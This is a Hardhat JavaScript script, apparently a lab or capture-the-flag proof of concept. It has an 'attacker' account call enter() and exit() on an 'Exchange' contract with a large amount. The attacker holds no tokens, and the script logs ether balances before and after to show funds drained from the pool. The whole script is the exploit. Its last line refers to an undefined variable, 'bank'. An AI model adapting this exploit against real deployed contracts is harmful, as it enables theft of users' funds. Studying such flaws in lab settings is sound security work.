const { EtherscanPlugin } = require("ethers");
const {ethers} = require("hardhat");
const ERC20_pool = "0x5FC8d32690cc91D4c39d9d3abcBD16989F875707"; // instance of StokenERC20 contract
const Exchange = "0x0165878A594ca255338adfa4d48449f69242Eb8F"; // instance of Exchange contract
async function main () {
    const [deployer, user1, attacker] = await ethers.getSigners();
    //const test_eth = ethers.parseEther("100");
    const test_eth = ethers.parseEther("4550");
    /*const IERC20_deployer = await ethers.getContractAt(
        "StokenERC20",
        ERC20_pool,
        deployer
    ); */

    //const deployer_sign = await ethers.getSigner(deployer.address);
    const bank_user1 = await ethers.getContractAt(
        "Exchange",
        Exchange,
        user1
    );

    const bank_attacker = await ethers.getContractAt(
        "Exchange", 
        Exchange,
        attacker
    );

    const token_pool_user1 = await ethers.getContractAt(
        "StokenERC20",
        ERC20_pool,
        user1
    );

    const token_pool_attacker = await ethers.getContractAt(
        "StokenERC20",
        ERC20_pool,
        attacker
    );

    //await IERC20_deployer.transfer(user1.address, test_eth); 
    //user1 have 100 eth token before
    console.log("user1 token balance :", ethers.formatEther(await token_pool_user1.balanceOf(user1.address)));
    //attacker holding 0 eth token before
    console.log("attacker token balance :", ethers.formatEther(await token_pool_attacker.balanceOf(attacker.address)));
    await bank_attacker.enter(test_eth);
    console.log("Before attacker ETH balance: ", ethers.formatEther(await ethers.provider.getBalance(attacker.address)));
    await bank_attacker.exit(test_eth);
    console.log("After attacker ETh balance: ", ethers.formatEther(await ethers.provider.getBalance(attacker.address)));
    console.log("token pool: ", ethers.formatEther(await ethers.provider.getBalance(bank)));
}

main().catch((error => {
    console.log(error);
    process.exit(1);
})) 
